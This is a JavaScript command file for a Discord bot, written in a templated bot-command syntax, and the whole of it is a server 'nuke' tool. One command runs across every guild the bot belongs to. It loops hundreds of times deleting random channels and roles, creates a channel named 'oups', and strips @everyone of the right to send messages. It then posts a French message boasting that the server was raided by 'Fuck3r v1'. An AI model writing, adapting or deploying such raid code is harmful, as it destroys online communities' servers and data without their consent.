module.exports = [{
  name: "fuck-all",
  code: `
$forEachGuild[fuckall]
 `
}, {
  type: 'awaitedCommand',
  name: "fuckall",
  code: `$loop[1;fuck-all-msg]
$loop[1;fuck-all-ch]
  $loop[500;fuck-all-role]
  $loop[500;fuck-all]`
}, {
  type: 'awaitedCommand',
  name: "fuck-all",
  code: `$deleteChannels[$randomChannelID]`
}, {
  type: 'awaitedCommand',
  name: "fuck-all-role",
  code: `$deleteRoles[$randomRoleID]`
}, {
  type: 'awaitedCommand',
  name: "fuck-all-ch",
  code: `$createChannel[oups;text]`
}, {
  type: 'awaitedCommand',
  name: "fuck-all-msg",
  code: `$modifyChannelPerms[$randomChannelID;-sendmessages;+readmessages;$guildID]

$channelSendMessage[$randomChannelID;**Oups...**
Ce serveur viens de ce faire raid par Fuck3r v1.
Desole du derangement @everyone]`
}]